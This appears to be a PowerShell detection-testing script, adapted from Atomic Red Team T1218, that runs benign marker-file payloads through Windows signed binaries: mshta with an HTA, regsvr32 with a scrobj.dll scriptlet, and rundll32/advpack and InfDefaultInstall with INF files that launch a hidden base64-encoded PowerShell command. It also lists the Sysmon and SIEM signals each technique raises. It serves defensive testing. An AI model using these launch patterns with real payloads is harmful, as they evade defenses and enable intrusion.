<#
.SYNOPSIS
    Vector 3.3: Living-off-the-Land Signed Binary Proxy Execution (T1218)

.DESCRIPTION
    Four sub-tests covering common Microsoft-signed binaries that proxy execution
    of script or installer content. These are adapted from Atomic Red Team T1218
    families, but kept fully offline and benign for submission: the script
    generates temporary payload files locally and each payload only writes a
    marker file to C:\Windows\Temp.

    Sub-test 1 (MshtaHTA)         - mshta.exe executes a local HTA containing
                                    VBScript. Atomic family: T1218.005.

    Sub-test 2 (Regsvr32SCT)      - regsvr32.exe loads a local COM scriptlet
                                    through scrobj.dll. Atomic family: T1218.010.

    Sub-test 3 (Rundll32Advpack)  - rundll32.exe calls advpack.dll,
                                    LaunchINFSection against a local INF.
                                    Atomic family: T1218.011.

    Sub-test 4 (InfDefaultInstall)- InfDefaultInstall.exe executes a local INF.
                                    Atomic family: T1218.

    Nothing malicious runs. All payloads are marker-file writes only.
    All temporary payload files are created under %TEMP% and can be cleaned up.

.PARAMETER Technique
    Which sub-test to run. Use 'All' to run all four sequentially.
    Default: MshtaHTA.

.EXAMPLE
    .\v3.3-lotl-signed-binary.ps1 -Technique MshtaHTA
    .\v3.3-lotl-signed-binary.ps1 -Technique All
#>

param(
    [ValidateSet('MshtaHTA','Regsvr32SCT','Rundll32Advpack','InfDefaultInstall','All')]
    [string]$Technique = 'MshtaHTA',
    [switch]$NoCleanupPrompt
)

$tempDir    = "C:\Windows\Temp"
$payloadDir = Join-Path $env:TEMP "sct-v3.3-lolbin"

# ==============================================================================
# HELPERS
# ==============================================================================

function Write-Header {
    param([string]$Title, [string]$Detection)
    Write-Host ("`n" + ("="*90)) -ForegroundColor Magenta
    Write-Host "  TECHNIQUE: $Title" -ForegroundColor Magenta
    Write-Host "  DETECTION DIFFICULTY: $Detection" -ForegroundColor Magenta
    Write-Host ("="*90) -ForegroundColor Magenta
}

function Get-EncodedCommand {
    param([string]$Command)
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
}

function New-PayloadDirectory {
    if (-not (Test-Path $payloadDir)) {
        New-Item -Path $payloadDir -ItemType Directory -Force | Out-Null
    }
}

function Test-ExecutionResult {
    param([string]$Name)
    Start-Sleep -Milliseconds 1500
    $marker = "$tempDir\art-v3.3-$Name.txt"
    if (Test-Path $marker) {
        Write-Host "[+] SUCCESS: Signed binary proxied payload execution - $marker" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[-] FAILED: Marker file not found (payload blocked or technique unsupported)" -ForegroundColor Red
        return $false
    }
}

function Invoke-Cleanup {
    param([string[]]$Names)
    foreach ($n in $Names) {
        Remove-Item "$tempDir\art-v3.3-$n.txt" -Force -ErrorAction Ignore
    }
    Remove-Item $payloadDir -Recurse -Force -ErrorAction Ignore
    Write-Host "[+] Cleanup complete" -ForegroundColor Green
}

function New-MarkerCommand {
    param([string]$Name)
    $marker = "$tempDir\art-v3.3-$Name.txt"
    return "Set-Content -Path '$marker' -Value ('[' + (Get-Date) + '] $Name signed-binary proxy execution')"
}

# ==============================================================================
# SUB-TEST 1: mshta.exe local HTA execution
# Atomic Red Team: T1218.005 family
# ==============================================================================

function Test-MshtaHTA {
    Write-Header "mshta.exe Local HTA Execution (Atomic T1218.005 family)" "HIGH"
    Write-Host "`nBinary : C:\Windows\System32\mshta.exe"
    Write-Host "Method : Create a local .hta file containing VBScript and execute it through"
    Write-Host "         mshta.exe. The script runs outside the browser security context and"
    Write-Host "         writes a benign marker file."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - mshta.exe process creation with a user-writable .hta path"
    Write-Host "  Sysmon 11  - .hta file created in %TEMP%"
    Write-Host "  EDR alert  - mshta.exe executing script content or spawning script activity"
    Write-Host "  SIEM rule  - mshta.exe with command line containing .hta or http/https/script protocol"

    New-PayloadDirectory
    $htaPath = Join-Path $payloadDir "sct-v3.3-mshta.hta"
    $marker  = "$tempDir\art-v3.3-MshtaHTA.txt"

    $htaContent = @"
<html>
<head>
<HTA:APPLICATION ID="SCTMshtaHTA" APPLICATIONNAME="SCTMshtaHTA" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
<script language="VBScript">
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.CreateTextFile("$marker", True)
f.WriteLine "[" & Now() & "] MshtaHTA signed-binary proxy execution"
f.Close
self.close
</script>
</head>
<body></body>
</html>
"@

    Write-Host "`n[*] Writing local HTA payload..." -ForegroundColor Yellow
    Write-Host "    File: $htaPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $htaPath -Value $htaContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: HTA write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching mshta.exe with local HTA..." -ForegroundColor Yellow
    Write-Host "    Command: mshta.exe `"$htaPath`"" -ForegroundColor DarkGray
    try {
        Start-Process "C:\Windows\System32\mshta.exe" -ArgumentList "`"$htaPath`"" -Wait -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "MshtaHTA")
}

# ==============================================================================
# SUB-TEST 2: regsvr32.exe local COM scriptlet execution
# Atomic Red Team: T1218.010 family
# ==============================================================================

function Test-Regsvr32SCT {
    Write-Header "regsvr32.exe Local COM Scriptlet Execution (Atomic T1218.010 family)" "HIGH"
    Write-Host "`nBinary : C:\Windows\System32\regsvr32.exe"
    Write-Host "Method : Create a local .sct COM scriptlet and ask regsvr32.exe to load it"
    Write-Host "         through scrobj.dll with /s /u /i. This does not register a COM object;"
    Write-Host "         it proxies script execution through a Microsoft-signed binary."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - regsvr32.exe with /i:<path or URL> and scrobj.dll"
    Write-Host "  Sysmon 7   - scrobj.dll loaded by regsvr32.exe"
    Write-Host "  Sysmon 11  - .sct file created in %TEMP%"
    Write-Host "  EDR alert  - Squiblydoo-style regsvr32 scriptlet execution"

    New-PayloadDirectory
    $sctPath = Join-Path $payloadDir "sct-v3.3-regsvr32.sct"
    $marker  = "$tempDir\art-v3.3-Regsvr32SCT.txt"

    $sctContent = @"
<?XML version="1.0"?>
<scriptlet>
  <registration progid="SCT.Regsvr32" classid="{11111111-1111-1111-1111-111111111111}">
    <script language="JScript">
      <![CDATA[
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var f = fso.CreateTextFile("$($marker.Replace('\','\\'))", true);
        f.WriteLine("[" + new Date().toString() + "] Regsvr32SCT signed-binary proxy execution");
        f.Close();
      ]]>
    </script>
  </registration>
</scriptlet>
"@

    Write-Host "`n[*] Writing local SCT payload..." -ForegroundColor Yellow
    Write-Host "    File: $sctPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $sctPath -Value $sctContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: SCT write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching regsvr32.exe with /s /u /i:<sct> scrobj.dll..." -ForegroundColor Yellow
    Write-Host "    Command: regsvr32.exe /s /u /i:`"$sctPath`" scrobj.dll" -ForegroundColor DarkGray
    try {
        $p = Start-Process "C:\Windows\System32\regsvr32.exe" -ArgumentList "/s /u /i:`"$sctPath`" scrobj.dll" -Wait -PassThru -ErrorAction Stop
        Write-Host "    regsvr32.exe exit code: $($p.ExitCode)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "Regsvr32SCT")
}

# ==============================================================================
# SUB-TEST 3: rundll32.exe advpack.dll INF execution
# Atomic Red Team: T1218.011 family
# ==============================================================================

function Test-Rundll32Advpack {
    Write-Header "rundll32.exe advpack.dll INF Execution (Atomic T1218.011 family)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\rundll32.exe"
    Write-Host "Method : Create a local INF with a RunPreSetupCommands section and ask"
    Write-Host "         rundll32.exe to call advpack.dll,LaunchINFSection. The command"
    Write-Host "         only writes a marker file."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - rundll32.exe calling advpack.dll,LaunchINFSection"
    Write-Host "  Sysmon 11  - INF file created in %TEMP%"
    Write-Host "  EDR alert  - rundll32.exe launching setup/installer helper routines"
    Write-Host "  SIEM rule  - rundll32 command line contains LaunchINFSection"

    New-PayloadDirectory
    $infPath = Join-Path $payloadDir "sct-v3.3-rundll32.inf"
    $encoded = Get-EncodedCommand (New-MarkerCommand -Name "Rundll32Advpack")

    $infContent = @"
[version]
Signature=`$CHICAGO`$

[DefaultInstall_SingleUser]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded

[Strings]
AppAct="SCT"
ServiceName="SCT"
ShortSvcName="SCT"
"@

    Write-Host "`n[*] Writing local INF payload..." -ForegroundColor Yellow
    Write-Host "    File: $infPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $infPath -Value $infContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: INF write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching rundll32.exe advpack.dll,LaunchINFSection..." -ForegroundColor Yellow
    Write-Host "    Command: rundll32.exe advpack.dll,LaunchINFSection `"$infPath`",DefaultInstall_SingleUser,1," -ForegroundColor DarkGray
    try {
        $args = "advpack.dll,LaunchINFSection `"$infPath`",DefaultInstall_SingleUser,1,"
        $p = Start-Process "C:\Windows\System32\rundll32.exe" -ArgumentList $args -Wait -PassThru -ErrorAction Stop
        Write-Host "    rundll32.exe exit code: $($p.ExitCode)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "Rundll32Advpack")
}

# ==============================================================================
# SUB-TEST 4: InfDefaultInstall.exe INF execution
# Atomic Red Team: T1218 family
# ==============================================================================

function Test-InfDefaultInstall {
    Write-Header "InfDefaultInstall.exe Local INF Execution (Atomic T1218 family)" "MEDIUM"
    Write-Host "`nBinary : C:\Windows\System32\InfDefaultInstall.exe"
    Write-Host "Method : Create a local INF with RunPreSetupCommands and execute it through"
    Write-Host "         InfDefaultInstall.exe. This covers a different signed installer"
    Write-Host "         binary than the rundll32/advpack path."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 1   - InfDefaultInstall.exe with a user-writable INF path"
    Write-Host "  Sysmon 11  - INF file created in %TEMP%"
    Write-Host "  EDR alert  - installer binary executing script/interpreter child process"
    Write-Host "  SIEM rule  - InfDefaultInstall.exe launched outside normal driver/software install"

    New-PayloadDirectory
    $infPath = Join-Path $payloadDir "sct-v3.3-infdefaultinstall.inf"
    $encoded = Get-EncodedCommand (New-MarkerCommand -Name "InfDefaultInstall")

    $infContent = @"
[version]
Signature=`$CHICAGO`$

[DefaultInstall]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded

[Strings]
AppAct="SCT"
ServiceName="SCT"
ShortSvcName="SCT"
"@

    Write-Host "`n[*] Writing local INF payload..." -ForegroundColor Yellow
    Write-Host "    File: $infPath" -ForegroundColor DarkGray
    try {
        Set-Content -Path $infPath -Value $infContent -Encoding ASCII -ErrorAction Stop
    } catch {
        Write-Host "  RESULT: INF write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Launching InfDefaultInstall.exe..." -ForegroundColor Yellow
    Write-Host "    Command: InfDefaultInstall.exe `"$infPath`"" -ForegroundColor DarkGray
    try {
        $p = Start-Process "C:\Windows\System32\InfDefaultInstall.exe" -ArgumentList "`"$infPath`"" -Wait -PassThru -ErrorAction Stop
        Write-Host "    InfDefaultInstall.exe exit code: $($p.ExitCode)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "InfDefaultInstall")
}

# ==============================================================================
# RUN ALL
# ==============================================================================

function Test-All {
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|   SIGNED BINARY PROXY EXECUTION - ALL TECHNIQUES                            |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan

    $tests = @(
        @{ Name = 'MshtaHTA';           Fn = ${function:Test-MshtaHTA}           },
        @{ Name = 'Regsvr32SCT';        Fn = ${function:Test-Regsvr32SCT}        },
        @{ Name = 'Rundll32Advpack';    Fn = ${function:Test-Rundll32Advpack}    },
        @{ Name = 'InfDefaultInstall';  Fn = ${function:Test-InfDefaultInstall}  }
    )

    $results = @()
    foreach ($t in $tests) {
        $results += @{ Name = $t.Name; Success = (& $t.Fn) }
        Write-Host "`n[!] Check EDR/AV console before continuing." -ForegroundColor Yellow
        [void](Read-Host "    Press Enter for next sub-test")
    }
    return $results
}

# ==============================================================================
# REPORT
# ==============================================================================

function Write-Report {
    param([array]$Results)
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|                         EXECUTION REPORT                                    |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan
    foreach ($r in $Results) {
        $label = if ($r.Success) { "EXECUTED" } else { "BLOCKED " }
        $color = if ($r.Success) { 'Green' } else { 'Red' }
        Write-Host "  [$label] $($r.Name)" -ForegroundColor $color
    }
    $ok    = ($Results | Where-Object { $_.Success }).Count
    $total = $Results.Count
    Write-Host "`n  $ok of $total signed-binary proxy techniques executed" -ForegroundColor Cyan
}

# ==============================================================================
# MAIN
# ==============================================================================

Write-Host "`n[TEST] Living-off-the-Land Signed Binary Proxy Execution (Vector 3.3)" -ForegroundColor Cyan
Write-Host "  MITRE: T1218  |  Phase 3  |  Privilege Escalation / Defense Evasion`n"

switch ($Technique) {
    'All' {
        $results = Test-All
        Write-Report -Results $results
        Write-Host "`n[*] Marker files in $tempDir (art-v3.3-*.txt) left for review." -ForegroundColor Yellow
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') {
                Invoke-Cleanup -Names @('MshtaHTA','Regsvr32SCT','Rundll32Advpack','InfDefaultInstall')
            }
        }
    }
    default {
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "|   SINGLE TECHNIQUE: $Technique" -ForegroundColor Cyan
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "`n[!] Have EDR/AV console visible before proceeding." -ForegroundColor Yellow
        Read-Host "    Press Enter to start"

        $success = switch ($Technique) {
            'MshtaHTA'          { Test-MshtaHTA          }
            'Regsvr32SCT'       { Test-Regsvr32SCT       }
            'Rundll32Advpack'   { Test-Rundll32Advpack   }
            'InfDefaultInstall' { Test-InfDefaultInstall }
        }

        $color = if ($success) { 'Green' } else { 'Red' }
        Write-Host "`n[RESULT] Technique '$Technique': $(if ($success) { 'EXECUTED' } else { 'BLOCKED' })" -ForegroundColor $color
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') { Invoke-Cleanup -Names @($Technique) }
        }
    }
}
